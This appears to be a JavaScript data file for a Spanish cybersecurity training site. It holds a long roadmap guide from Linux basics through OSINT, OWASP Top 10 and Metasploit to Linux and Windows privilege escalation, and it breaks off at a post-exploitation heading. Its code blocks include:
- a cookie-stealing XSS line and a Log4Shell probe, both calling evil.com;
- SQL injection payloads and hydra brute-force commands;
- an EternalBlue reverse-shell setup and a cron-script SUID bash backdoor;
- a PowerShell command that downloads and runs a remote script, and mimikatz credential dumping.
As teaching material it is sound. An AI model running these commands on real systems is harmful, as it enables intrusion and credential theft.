window.GUIDES_DATA = {
  categories: [
    { id: "all", label: "Todas", icon: "📊" },
    { id: "roadmap", label: "Roadmaps", icon: "🗺️" },
    { id: "tecnicas", label: "Técnicas", icon: "⚙️" },
    { id: "herramientas", label: "Herramientas", icon: "🛠️" },
    { id: "carrera", label: "Carrera", icon: "🎓" },
    { id: "legal", label: "Legal & Ético", icon: "⚖️" }
  ],
  guides: [
    {
      id: "cero-to-hero",
      title: "Cero a Hero en Ciberseguridad",
      subtitle: "Roadmap completo 12 meses",
      emoji: "🎯", category: "roadmap", level: "Principiante",
      elements: 200, estimatedReadTime: 45,
      tags: ["principiante", "roadmap", "completo", "12meses", "guia-estudio"],
      linkedArticles: [],
      description: "El plan de estudios más completo para pasar de cero a profesional en ciberseguridad en 12 meses. 8 fases, 40+ herramientas, 200+ conceptos, ejercicios prácticos y recursos.",
      content: `<div class="guide-content">
<div class="guide-callout goal"><strong>🎯 Objetivo General:</strong> En 12 meses, dedicando 10-15 horas semanales, pasarás de completo principiante a un profesional de ciberseguridad empleable. Este roadmap está diseñado por profesionales del sector y cubre exactamente lo que necesitas saber, en el orden correcto.</div>

<h3>📌 Cómo usar este roadmap</h3>
<p>Este plan está dividido en 8 fases distribuidas en 12 meses. Cada fase incluye:</p>
<ul>
<li><strong>Objetivos de aprendizaje</strong> — qué saber al terminar</li>
<li><strong>Recursos</strong> — enlaces, cursos, libros (todos gratuitos donde sea posible)</li>
<li><strong>Ejercicios prácticos</strong> — lo que DEBES hacer para consolidar</li>
<li><strong>Hitos (milestones)</strong> — señales de que vas bien</li>
</ul>
<p>No te saltes fases. Cada una construye sobre la anterior. Si ya sabes algo, úsalo como repaso y ve más rápido.</p>

<div class="guide-callout tip">💡 <strong>Ritmo recomendado:</strong> 10h/semana = 40h/mes = 480h total. Si puedes dedicar más, genial. Si menos, extiende el roadmap a 18 meses. La clave es la <strong>consistencia</strong>, no la intensidad.</div>

<h3>🐧 FASE 1: Fundamentos — Linux, Redes y Programación (Meses 1-2, ≈120h)</h3>
<p>Sin una base sólida, todo lo demás será frustrante. Estos dos meses son los más importantes de todo el roadmap. No los subestimes.</p>

<h4>1.1 Linux Profundo (40h)</h4>
<p>Linux es EL sistema operativo de la ciberseguridad. No es opcional, es obligatorio.</p>

<h5>1.1.1 Instalación y entorno</h5>
<ul>
<li>Instala <strong>Ubuntu</strong> o <strong>Kali Linux</strong> en una máquina virtual (VirtualBox o VMware)</li>
<li>Familiarízate con el escritorio, terminal, gestor de paquetes (apt)</li>
<li>Aprende a navegar el sistema de archivos: <code>/</code>, <code>/home</code>, <code>/etc</code>, <code>/var</code>, <code>/usr</code>, <code>/tmp</code></li>
</ul>

<h5>1.1.2 Comandos esenciales (domínalos todos)</h5>
<pre><code class="language-bash"># Navegación y archivos
pwd                       # directorio actual
ls -la                    # listar archivos con detalles
cd /ruta                  # cambiar directorio
cp -r origen destino      # copiar recursivamente
mv origen destino         # mover/renombrar
rm -rf dir               # eliminar directorio (¡CUIDADO!)
mkdir -p a/b/c           # crear directorios anidados
touch archivo.txt         # crear archivo vacío

# Permisos y propietarios
chmod 755 script.sh       # rwxr-xr-x
chmod u+x script.sh       # añadir ejecución al usuario
chown user:user archivo   # cambiar propietario
umask 022                 # permisos por defecto

# Búsqueda y filtrado
grep -r "texto" /ruta     # buscar recursivamente
find / -name "*.conf"     # buscar archivos
locate archivo            # búsqueda rápida (updatedb)
wc -l archivo             # contar líneas

# Red
ip a                      # interfaces de red
ip route                  # tabla de rutas
ss -tulpn                 # puertos escuchando
netstat -tulpn            # (obsoleto pero común)
ping -c 4 8.8.8.8         # ICMP echo

# Procesos
ps aux                    # todos los procesos
top / htop                # monitor interactivo
kill -9 PID               # matar proceso
systemctl start/stop/status servicio

# Compresión
tar -czvf archivo.tar.gz dir/
tar -xzvf archivo.tar.gz
unzip archivo.zip</code></pre>

<h5>1.1.3 Bash Scripting</h5>
<p>No necesitas ser programador Bash experto, pero sí saber automatizar tareas:</p>
<pre><code class="language-bash">#!/bin/bash
# Script de escaneo básico
TARGET=$1
echo "Escaneando $TARGET..."
for port in 22 80 443 8080; do
  timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null &&
    echo "Puerto $port: ABIERTO" ||
    echo "Puerto $port: cerrado"
done

# Variables, condiciones, bucles
USUARIO=$(whoami)
if [ "$USUARIO" != "root" ]; then
  echo "Ejecuta como root"
  exit 1
fi

for i in {1..10}; do
  echo "Iteración $i"
done</code></pre>

<h5>1.1.4 Práctica obligatoria</h5>
<ul>
<li><strong>OverTheWire Bandit</strong> (todos los niveles) — https://overthewire.org/wargames/bandit/</li>
<li>Configura un servidor web Apache desde cero en tu VM</li>
<li>Escribe 5 scripts Bash que automaticen tareas cotidianas</li>
<li>Créate un usuario no-root y practica permisos</li>
</ul>

<div class="guide-callout tip">💡 <strong>Hito FASE 1:</strong> Puedes usar la terminal sin miedo, sabes qué hace cada comando común, y eres capaz de escribir scripts simples. Has completado Bandit niveles 0-34.</div>

<h4>1.2 Redes (30h)</h4>
<p>Sin entender cómo se comunican los sistemas, no puedes defenderlos ni atacarlos.</p>

<h5>1.2.1 Modelo OSI (7 capas)</h5>
<table>
<tr><th>Capa</th><th>Función</th><th>Protocolos</th><th>Dispositivos</th></tr>
<tr><td>7 Aplicación</td><td>Interfaz con el usuario/aplicación</td><td>HTTP, FTP, SMTP, DNS</td><td>Navegador, cliente email</td></tr>
<tr><td>6 Presentación</td><td>Codificación, cifrado, compresión</td><td>SSL/TLS, JPEG, MPEG</td><td>—</td></tr>
<tr><td>5 Sesión</td><td>Gestión de sesiones</td><td>NetBIOS, RPC</td><td>—</td></tr>
<tr><td>4 Transporte</td><td>Segmentación, control de flujo, fiabilidad</td><td>TCP, UDP</td><td>Firewall</td></tr>
<tr><td>3 Red</td><td>Direccionamiento lógico, enrutamiento</td><td>IP, ICMP, ARP</td><td>Router</td></tr>
<tr><td>2 Enlace</td><td>Direccionamiento físico, detección errores</td><td>Ethernet, MAC, VLAN</td><td>Switch</td></tr>
<tr><td>1 Física</td><td>Transmisión de bits (cables, wifi)</td><td>10/100/1000BASE-T</td><td>Hub, repetidor</td></tr>
</table>

<h5>1.2.2 TCP vs UDP</h5>
<table>
<tr><th>Característica</th><th>TCP</th><th>UDP</th></tr>
<tr><td>Conexión</td><td>Orientado a conexión (3-way handshake)</td><td>Sin conexión</td></tr>
<tr><td>Fiabilidad</td><td>Sí (ACK, retransmisión)</td><td>No (fire and forget)</td></tr>
<tr><td>Orden</td><td>Paquetes ordenados</td><td>Sin orden garantizado</td></tr>
<tr><td>Velocidad</td><td>Más lento (overhead)</td><td>Más rápido</td></tr>
<tr><td>Uso típico</td><td>Web (HTTP), email (SMTP), SSH</td><td>DNS, VoIP, streaming, gaming</td></tr>
</table>

<h5>1.2.3 Puertos y protocolos (memoriza estos)</h5>
<table>
<tr><th>Puerto</th><th>Protocolo</th><th>Uso</th><th>Transporte</th></tr>
<tr><td>20/21</td><td>FTP</td><td>Transferencia de archivos</td><td>TCP</td></tr>
<tr><td>22</td><td>SSH</td><td>Shell seguro, administración remota</td><td>TCP</td></tr>
<tr><td>23</td><td>Telnet</td><td>Shell sin cifrar (obsoleto)</td><td>TCP</td></tr>
<tr><td>25</td><td>SMTP</td><td>Envío de correo</td><td>TCP</td></tr>
<tr><td>53</td><td>DNS</td><td>Resolución de nombres</td><td>UDP/TCP</td></tr>
<tr><td>80</td><td>HTTP</td><td>Web sin cifrar</td><td>TCP</td></tr>
<tr><td>110</td><td>POP3</td><td>Recepción de correo</td><td>TCP</td></tr>
<tr><td>143</td><td>IMAP</td><td>Recepción de correo (con carpetas)</td><td>TCP</td></tr>
<tr><td>443</td><td>HTTPS</td><td>Web cifrada</td><td>TCP</td></tr>
<tr><td>445</td><td>SMB</td><td>Compartir archivos Windows</td><td>TCP</td></tr>
<tr><td>993</td><td>IMAPS</td><td>IMAP sobre SSL</td><td>TCP</td></tr>
<tr><td>1433</td><td>MSSQL</td><td>Base de datos SQL Server</td><td>TCP</td></tr>
<tr><td>1521</td><td>Oracle</td><td>Base de datos Oracle</td><td>TCP</td></tr>
<tr><td>3306</td><td>MySQL</td><td>Base de datos MySQL/MariaDB</td><td>TCP</td></tr>
<tr><td>3389</td><td>RDP</td><td>Escritorio remoto Windows</td><td>TCP</td></tr>
<tr><td>5432</td><td>PostgreSQL</td><td>Base de datos PostgreSQL</td><td>TCP</td></tr>
<tr><td>5900</td><td>VNC</td><td>Escritorio remoto</td><td>TCP</td></tr>
<tr><td>6379</td><td>Redis</td><td>Cache/BBDD en memoria</td><td>TCP</td></tr>
<tr><td>8080</td><td>HTTP-alt</td><td>Proxy, Tomcat, alternativo</td><td>TCP</td></tr>
<tr><td>27017</td><td>MongoDB</td><td>Base de datos MongoDB</td><td>TCP</td></tr>
</table>

<h5>1.2.4 Herramientas de red</h5>
<pre><code class="language-bash"># Capturar tráfico con tcpdump
sudo tcpdump -i eth0 -n
sudo tcpdump -i eth0 port 80 -A      # HTTP en ASCII
sudo tcpdump -i eth0 host 192.168.1.1
sudo tcpdump -i eth0 -w captura.pcap # guardar a archivo

# Wireshark (interfaz gráfica) — analiza capturas
# wireshark captura.pcap

# nmap (escaneo básico)
nmap -sn 192.168.1.0/24              # ping sweep
nmap -p 22,80,443 target.com         # puertos específicos
nmap -p- target.com                  # todos los puertos (65535)

# curl
curl -I https://example.com          # cabeceras HTTP
curl -v https://example.com          # verbose (todo)
curl -X POST -d "user=admin" url     # POST request

# dig / nslookup
dig example.com ANY +short
nslookup example.com
dig -x 8.8.8.8                       # reverse DNS</code></pre>

<h4>1.3 Programación (50h)</h4>
<p>No necesitas ser ingeniero de software, pero sí saber programar lo suficiente para automatizar, entender exploits y escribir herramientas.</p>

<h5>1.3.1 Python — EL lenguaje de la ciberseguridad</h5>

<pre><code class="language-python"># 1. Sintaxis básica
print("Hola mundo")
nombre = input("Tu nombre: ")
if len(nombre) > 5:
    print("Nombre largo")
else:
    print("Nombre corto")

# 2. Listas y diccionarios
herramientas = ["nmap", "burp", "metasploit"]
herramientas.append("sqlmap")
for h in herramientas:
    print(f"Herramienta: {h}")

puertos = {"ssh": 22, "http": 80, "https": 443}
for servicio, puerto in puertos.items():
    print(f"{servicio} corre en puerto {puerto}")

# 3. Funciones
def scan_port(target, port):
    import socket
    s = socket.socket()
    s.settimeout(1)
    result = s.connect_ex((target, port))
    s.close()
    return result == 0

# 4. Manejo de archivos
with open("passwords.txt", "r") as f:
    for line in f:
        print(line.strip())

# 5. Requests HTTP
import requests
r = requests.get("https://api.github.com")
print(r.status_code)
print(r.json())

# 6. Sockets — tu propia herramienta de red
import socket
def banner_grab(target, port):
    s = socket.socket()
    s.settimeout(3)
    try:
        s.connect((target, port))
        s.send(b"GET / HTTP/1.1\r\n\r\n")
        banner = s.recv(1024)
        return banner.decode(errors='ignore')
    except:
        return "Error conectando"
    finally:
        s.close()

# 7. Subprocess — ejecutar comandos del sistema
import subprocess
result = subprocess.run(["nmap", "-p", "80", "target.com"],
                       capture_output=True, text=True)
print(result.stdout)</code></pre>

<h5>1.3.2 Práctica de Python para hacking</h5>
<ul>
<li>Escribe un <strong>port scanner</strong> multi-threaded que escanee 1000 puertos en paralelo</li>
<li>Crea un <strong>web scraper</strong> que extraiga todos los enlaces de una página</li>
<li>Escribe un <strong>generador de wordlists</strong> personalizadas</li>
<li>Haz un <strong>hash cracker</strong> simple (MD5 con wordlist)</li>
<li>Crea un <strong>keylogger</strong> básico (para tu propio aprendizaje, en tu máquina)</li>
</ul>

<pre><code class="language-python"># Port scanner multi-threaded
import socket, threading
def scan(target, port):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print(f"[+] Puerto {port} abierto")
    except: pass
    finally: s.close()

target = input("Target: ")
for port in range(1, 1025):
    t = threading.Thread(target=scan, args=(target, port))
    t.start()</code></pre>

<h5>1.3.3 SQL básico</h5>
<p>Necesitas entender SQL para explotar y prevenir inyecciones:</p>
<pre><code class="language-sql">-- Consultas básicas
SELECT * FROM users;
SELECT username, email FROM users WHERE id = 1;
SELECT * FROM users ORDER BY created_at DESC LIMIT 10;

-- Joins
SELECT u.username, p.name
FROM users u
JOIN profiles p ON u.id = p.user_id;

-- Inyección SQL (cómo funciona)
-- Input del atacante: ' OR '1'='1' --
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'x'
-- Esto devuelve TODOS los usuarios porque '1'='1' siempre es true</code></pre>

<h5>1.3.4 JavaScript básico</h5>
<p>Suficiente para entender XSS y ataques client-side:</p>
<pre><code class="language-javascript">// DOM manipulation
document.getElementById('form').innerHTML = '';
// Fetch API
fetch('/api/users')
  .then(r => r.json())
  .then(data => console.log(data));
// XSS payload (cómo funciona)
// &lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
// Event listeners
document.querySelector('button').addEventListener('click', function() {
  alert('Click!');
});</code></pre>

<div class="guide-callout tip">💡 <strong>Hito FASE 1:</strong> Tienes instalado Linux (Kali o Ubuntu). Puedes usar la terminal con fluidez. Sabes cómo funcionan TCP/IP, DNS, HTTP. Escribes scripts en Python para automatizar tareas de red. Has completado Bandit y tienes 5 scripts Python funcionando.</div>

<h3>🔍 FASE 2: Reconocimiento y OSINT (Mes 3, ≈50h)</h3>
<p>El 80% del éxito en ciberseguridad es el reconocimiento. Cuanto más sepas de tu objetivo, más fácil será comprometerlo (o defenderlo).</p>

<h4>2.1 OSINT — Open Source Intelligence</h4>
<p>Recopilación de información de fuentes públicas SIN tocar el objetivo.</p>

<h5>2.1.1 Google Dorking — El arte de buscar</h5>
<pre><code class="language-text"># OPERADORES ESENCIALES
site:example.com               # resultados solo de ese dominio
filetype:pdf                    # tipo de archivo específico
intitle:"index of"              # páginas con "index of" en título
inurl:admin                     # URLs que contengan "admin"
intext:password                 # páginas que contengan "password"
cache:example.com               # versión cacheada de Google
link:example.com                # páginas que enlazan a example.com
related:example.com             # sitios similares

# EJEMPLOS PRÁCTICOS
site:example.com filetype:xls password
site:example.com inurl:admin intitle:login
site:example.com intitle:"index of" "backup"
site:example.com filetype:env DB_PASSWORD
site:example.com "Warning: mysql_connect()"
site:example.com inurl:phpMyAdmin
site:example.com "-----BEGIN RSA PRIVATE KEY-----"
site:github.com "example.com" "password"
site:pastebin.com "example.com"</code></pre>

<h5>2.1.2 Shodan — El buscador de dispositivos</h5>
<p>Shodan indexa dispositivos conectados a internet: routers, cámaras, servidores, IoT.</p>
<pre><code class="language-bash"># Búsquedas útiles en Shodan
port:22 country:ES               # SSH en España
port:3389 city:Madrid            # RDP en Madrid
port:21 "anonymous"              # FTP con acceso anónimo
"default password"               # Dispositivos con pass por defecto
org:"Telefonica"                 # Dispositivos de una organización
product:nginx version:1.18.0    # Versión específica de software
vuln:CVE-2023-44487             # Dispositivos vulnerables a CVE específica</code></pre>

<h5>2.1.3 theHarvester — Recolección automatizada</h5>
<pre><code class="language-bash"># Búsqueda básica
theHarvester -d example.com -b google
# Búsqueda en múltiples fuentes
theHarvester -d example.com -b google,linkedin,yahoo,dns,bing
# Límite de resultados
theHarvester -d example.com -l 500 -b all
# Guardar a archivo
theHarvester -d example.com -b all -f resultados.html</code></pre>

<h5>2.1.4 Recon-ng — Framework OSINT</h5>
<pre><code class="language-bash">recon-ng
# Dentro de la consola:
marketplace search          # buscar módulos
marketplace install recon/domains-hosts/google_site_web
workspace create target
use recon/domains-hosts/google_site_web
set SOURCE example.com
run
show hosts</code></pre>

<h5>2.1.5 Enumeración de subdominios</h5>
<pre><code class="language-bash"># Sublist3r
sublist3r -d example.com -o subdomains.txt

# Amass (OWASP) — el más completo
amass enum -d example.com -o amass_results.txt
amass enum -d example.com -config config.ini -o resultados
amass intel -d example.com -whois  # información WHOIS

# Findomain (rápido, usa Certificate Transparency)
findomain -t example.com -o

# crt.sh (Certificate Transparency)
curl -s "https://crt.sh/?q=%25.example.com&output=json" | \
  jq -r '.[].name_value' | sort -u

# DNS brute force
gobuster dns -d example.com -w subdomains-top1million-5000.txt -t 50</code></pre>

<h5>2.1.6 Fugas de datos y credenciales</h5>
<ul>
<li><strong>Have I Been Pwned:</strong> curl https://haveibeenpwned.com/api/v3/breachedaccount/email</li>
<li><strong>DeHashed:</strong> Búsqueda de credenciales en breaches (pago)</li>
<li><strong>Snusbase:</strong> Agregador de breaches</li>
<li><strong>IntelX:</strong> Búsqueda en pastebins, leaks, darkweb</li>
<li><strong>GitLeaks / TruffleHog:</strong> Buscar secrets en repos GitHub</li>
</ul>
<pre><code class="language-bash"># TruffleHog — buscar secrets en repos
trufflehog filesystem . --only-verified
# GitLeaks
gitleaks detect -v</code></pre>

<h4>2.2 Reconocimiento Activo</h4>
<p>Aquí ya interactúas con el objetivo, pero sin llegar a explotar.</p>

<h5>2.2.1 Nmap avanzado</h5>
<pre><code class="language-bash"># Tipos de escaneo
nmap -sS target              # SYN scan (sigiloso, requiere root)
nmap -sT target              # TCP connect scan
nmap -sU target              # UDP scan (lento)
nmap -sV target              # Detección de versiones
nmap -O target               # Detección de SO
nmap -A target               # Todo: SO, versiones, scripts, traceroute

# Combinaciones útiles
nmap -sC -sV -O -p- target              # completo pero lento
nmap -sC -sV -p 1-10000 target          # rápido, puertos comunes
nmap -sS -T4 --min-rate 1000 target     # rápido, agresivo
nmap -sn 192.168.1.0/24                 # descubrimiento de hosts
nmap --script vuln target               # scripts de vulnerabilidades
nmap --script http-enum target          # enumeración web
nmap -p 445 --script smb-vuln* target   # SMB vulnerabilities

# Output
nmap -oA escaneo target                 # todos los formatos
nmap -oX escaneo.xml target             # XML (para importar)
nmap -oG escaneo.gnmap target           # greppable</code></pre>

<h5>2.2.2 Enumeración web</h5>
<pre><code class="language-bash"># Gobuster — directorios
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50 -x php,html,txt -o directorios.txt

# Gobuster — subdominios (vHost)
gobuster vhost -u https://target.com \
  -w subdomains.txt -t 50

# FFUF — más rápido que gobuster
ffuf -u https://target.com/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 100 -c -o ffuf_results.json

# WhatWeb — identificar tecnologías
whatweb https://target.com -v

# Wappalyzer (extensión browser) o curl + grep
curl -I https://target.com | grep -i "server\|x-powered-by"</code></pre>

<div class="guide-callout tip">💡 <strong>Hito FASE 2:</strong> Puedes recopilar información completa de un objetivo sin explotarlo: emails, subdominios, tecnologías, puertos abiertos, versiones de servicios. Sabes usar Google Dorks como un profesional.</div>

<h3>🌐 FASE 3: Seguridad Web (Meses 4-5, ≈100h)</h3>
<p>Las vulnerabilidades web son las más comunes y las más explotadas. Esta fase es crítica.</p>

<h4>3.1 OWASP Top 10 (2021)</h4>
<p>Cada vulnerabilidad explicada con código, exploit y defensa. Estudia esto a fondo — aparece en TODAS las entrevistas.</p>

<h5>A01 — Broken Access Control</h5>
<p>Ocurre cuando un usuario puede acceder a recursos o funciones para los que no tiene permiso.</p>
<ul>
<li><strong>IDOR (Insecure Direct Object Reference):</strong> Cambiar un ID en la URL para acceder a datos de otro usuario</li>
<li><strong>Privilege Escalation:</strong> Acceder a funciones de admin siendo usuario normal</li>
<li><strong>Path Traversal:</strong> Leer archivos fuera del directorio raíz</li>
</ul>
<pre><code class="language-http"># IDOR — cambiar ID de usuario
GET /api/user/12345/profile HTTP/1.1
GET /api/user/12346/profile HTTP/1.1  # ¿Ves datos de otro?

# Path Traversal
GET /download?file=../../etc/passwd HTTP/1.1
GET /download?file=../../windows/system32/config/sam HTTP/1.1</code></pre>
<p><strong>Defensa:</strong> Autorización en cada endpoint, usar UUIDs, validar propiedad del recurso.</p>

<h5>A02 — Cryptographic Failures</h5>
<ul>
<li>Contraseñas en texto plano en base de datos</li>
<li>HTTP en vez de HTTPS</li>
<li>Cookies sin flags Secure y HttpOnly</li>
<li>Algoritmos criptográficos débiles (MD5, SHA1, DES, RC4)</li>
<li>Tokens JWT con algoritmo "none" o secret débil</li>
</ul>
<pre><code class="language-bash"># Verificar HTTPS
curl -sI https://target.com | grep -i strict-transport
# JWT débil
# jwt_tool eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.xxxx -T</code></pre>

<h5>A03 — Injection</h5>
<p>SQL, NoSQL, OS Command, LDAP, XPath — cuando datos no confiables se envían a un intérprete.</p>
<pre><code class="language-sql">-- SQL Injection clásica
' OR '1'='1' --
' UNION SELECT username,password FROM users --
' OR 1=1 --
admin' --
' OR sleep(5) --
' OR (SELECT 1 FROM users LIMIT 1) = 1 --

# SQLMap — automatización
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" -D dbname --tables
sqlmap -u "https://target.com/page?id=1" -D dbname -T users --dump</code></pre>

<pre><code class="language-python"># CÓDIGO VULNERABLE (Python)
username = request.GET['user']
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)  # ¡PELIGRO!

# CÓDIGO SEGURO
username = request.GET['user']
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))</code></pre>

<h5>A04 — Insecure Design</h5>
<p>Fallos de arquitectura que no se arreglan con un parche:</p>
<ul>
<li>Sin rate limiting en login (brute force ilimitado)</li>
<li>Proceso de reset de password inseguro (preguntas adivinables)</li>
<li>Confiar en el frontend para precios, roles, permisos</li>
<li>Falta de límites en APIs (sin paginación, sin throttle)</li>
</ul>

<h5>A05 — Security Misconfiguration</h5>
<pre><code class="language-bash"># Lo que buscas
# Directory listing activo
curl -s https://target.com/images/ | grep "Index of"
# Paneles de admin expuestos
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/admin.txt -t 50
# Cabeceras de seguridad faltantes
curl -sI https://target.com | grep -iE "x-frame|x-xss|strict|content-security"
# Métodos HTTP peligrosos
curl -X OPTIONS https://target.com -i
# Mensajes de error detallados
curl https://target.com/noexiste.html
curl "https://target.com/page?id=''"</code></pre>

<h5>A06 — Vulnerable Components</h5>
<p>Usar librerías con CVES conocidos. Log4Shell (CVE-2021-44228) es el ejemplo perfecto:</p>
<pre><code class="language-bash"># Log4Shell — exploit
curl -H 'User-Agent: \${jndi:ldap://evil.com/exploit}' https://target.com
# Escanear dependencias
npm audit
pip audit
safety check
# Trivy — escáner de imágenes y dependencias
trivy filesystem --severity HIGH,CRITICAL .
trivy image myapp:latest</code></pre>

<h5>A07 — Identification and Authentication Failures</h5>
<ul>
<li>Credenciales por defecto (admin:admin, root:toor)</li>
<li>Brute force sin límite</li>
<li>Session fixation, sesiones sin invalidar al logout</li>
<li>MFA ausente en cuentas privilegiadas</li>
<li>JWT con secret débil o algoritmo none</li>
</ul>
<pre><code class="language-bash"># Probar credenciales por defecto
hydra -l admin -P /usr/share/wordlists/fasttrack.txt \
  target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
# Fuerza bruta a SSH
hydra -l root -P rockyou.txt ssh://target.com -t 4
# Fuerza bruta a formulario WordPress
wpscan --url https://target.com --passwords rockyou.txt</code></pre>

<h5>A08 — Software and Data Integrity Failures</h5>
<ul>
<li><strong>Deserialización insegura:</strong> PHP unserialize(), Python pickle, Java readObject()</li>
<li><strong>Supply chain:</strong> Dependencias maliciosas (event-stream, colors.js, faker.js)</li>
<li><strong>CI/CD poisoning:</strong> Modificar pipelines para inyectar código</li>
<li><strong>Firmas digitales no verificadas:</strong> Actualizaciones sin checksums</li>
</ul>

<h5>A09 — Security Logging and Monitoring Failures</h5>
<p>No puedes responder a lo que no ves:</p>
<ul>
<li>Logs sin eventos de seguridad (login fallidos, cambios de rol, accesos denegados)</li>
<li>Logs no centralizados (sin SIEM)</li>
<li>Tiempo de detección (dwell time) de meses</li>
<li>Sin alertas para eventos críticos</li>
<li>Logs sin protección (alterables, sin firmar)</li>
</ul>

<h5>A10 — SSRF (Server-Side Request Forgery)</h5>
<p>El servidor hace peticiones a recursos internos controladas por el atacante:</p>
<pre><code class="language-bash"># SSRF a metadata cloud
curl "http://169.254.169.254/latest/meta-data/"  # AWS
curl "http://169.254.169.254/metadata/identity"   # Azure
curl "http://metadata.google.internal/computeMetadata/v1/"  # GCP
# SSRF a servicios internos
curl "http://localhost:5000/"
curl "http://localhost:6379/"  # Redis sin auth
curl "file:///etc/passwd"</code></pre>

<h4>3.2 Burp Suite — La herramienta reina del web pentesting</h4>
<pre><code class="language-bash"># Configuración básica
# 1. Abre Burp Suite Community
# 2. Proxy > Options > Add listener: 127.0.0.1:8080
# 3. Configura tu navegador para usar proxy 127.0.0.1:8080
# 4. Instala certificado de Burp en el navegador

# Flujo de trabajo
# 1. Target > Scope: añadir objetivo
# 2. Proxy > Intercept: ON
# 3. Navega por el sitio
# 4. Manda peticiones a Repeater (Ctrl+R) o Intruder (Ctrl+I)
# 5. Repeater: modifica y reenvía peticiones manualmente
# 6. Intruder: automatiza ataques (brute force, fuzzing)
# 7. Scanner (solo Professional): escaneo automático</code></pre>

<h4>3.3 Práctica de Seguridad Web</h4>
<ul>
<li><strong>PortSwigger Web Security Academy</strong> (gratis, oficial OWASP) — TODOS los laboratorios</li>
<li><strong>TryHackMe:</strong> Path "Web Fundamentals" + "Jr Penetration Tester"</li>
<li><strong>HackTheBox:</strong> Máquinas fáciles: Shocker, Lame, Blue, Nibbles, Sense</li>
<li><strong>DVWA:</strong> Entrena SQLi, XSS, LFI, RFI en local</li>
<li><strong>bWAPP / WebGoat:</strong> Más laboratorios OWASP</li>
</ul>

<div class="guide-callout tip">💡 <strong>Hito FASE 3:</strong> Entiendes las 10 vulnerabilidades OWASP, sabes identificar SQLi, XSS, LFI en código y en peticiones HTTP. Usas Burp Suite con fluidez. Has completado al menos 30 laboratorios de PortSwigger.</div>

<h3>⚡ FASE 4: Explotación y Post-Explotación (Meses 6-7, ≈80h)</h3>

<h4>4.1 Metasploit Framework</h4>
<p>El framework de explotación más usado del mundo.</p>
<pre><code class="language-bash"># Consola básica
msfconsole -q

# Buscar exploits
search apache
search type:exploit platform:linux
search cve:2023
search eternalblue

# Usar un exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tu_ip
set LPORT 4444
run

# Meterpreter — una vez comprometido
help                        # comandos disponibles
sysinfo                     # información del sistema
getuid                      # quién eres
getsystem                   # escalar a SYSTEM
download /etc/shadow        # descargar archivos
upload script.sh            # subir archivos
shell                       # shell del sistema
hashdump                    # volcar hashes de Windows
keyscan_start               # keylogger (si está en desktop)
screenshot                  # captura de pantalla
background                  # enviar sesión a background
sessions -l                 # listar sesiones
sessions -i 1               # interactuar con sesión 1

# Auxiliary modules
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_login</code></pre>

<h4>4.2 Searchsploit — Base de datos de exploits local</h4>
<pre><code class="language-bash"># Buscar exploits
searchsploit apache 2.4.49
searchsploit wordpress 5.8
searchsploit -t linux kernel
# Ver detalles de un exploit
searchsploit -x exploits/linux/remote/12345.py
# Mirrors: copia el exploit al directorio actual
searchsploit -m 12345</code></pre>

<h4>4.3 Escalado de Privilegios Linux</h4>
<p>Una vez dentro del sistema, necesitas ser root.</p>
<pre><code class="language-bash"># Enumera el sistema
hostname
uname -a                    # kernel version
cat /etc/os-release
id
sudo -l                     # qué puedes ejecutar como sudo (¡CLAVE!)
ls -la /etc/sudoers.d/
cat /etc/crontab            # tareas programadas
crontab -l
find / -perm -4000 2>/dev/null  # SUID binaries
find / -perm -2000 2>/dev/null  # SGID binaries
cat /etc/passwd             # usuarios del sistema
cat /etc/shadow             # hashes (solo root)
ls -la /home/*/             # archivos de usuarios
netstat -tulpn             # conexiones de red
ps aux                     # procesos
cat ~/.bash_history        # historial de comandos

# LinPEAS — escáner automático
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Técnicas comunes de escalado
# 1. Binarios SUID: buscar GTFO bins
gtfobins.github.io
# 2. Sudo: si puedes ejecutar algo como sudo sin password
sudo -l
# 3. Kernel exploits: buscar por versión
searchsploit linux kernel 5.10
# 4. Cron jobs: si un script se ejecuta como root y es writeable
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /ruta/al/script
# 5. Capacidades (capabilities)
getcap -r / 2>/dev/null
# 6. NFS: si un share montado permite root_squash
showmount -e localhost</code></pre>

<h4>4.4 Escalado de Privilegios Windows</h4>
<pre><code class="language-bash"># Enumeración básica
whoami
whoami /priv               # privilegios del usuario
systeminfo                  # información del sistema
net user                    # usuarios
net localgroup Administrators
tasklist /SVC              # procesos y servicios
wmic product get name       # programas instalados
wmic service list brief    # servicios
reg query HKLM /v          # registro

# WinPEAS
# Descargar y ejecutar
winpeas.exe

# PowerUp — PowerShell
powershell -ep bypass
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
Invoke-AllChecks

# Técnicas comunes
# 1. Service permissions débiles
accesschk.exe /acceptula -uwqc "servicename"
sc qc servicename
# 2. Unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows"
# 3. AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 4. Tokens (SeImpersonatePrivilege)
# JuicyPotato, RoguePotato, PrintSpoofer
# 5. Credenciales en archivos
findstr /si password *.txt *.xml *.ini *.config
# 6. Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords</code></pre>

<h4>4.5 Post-Explotación — Persistencia y Movimiento Lateral</h4>
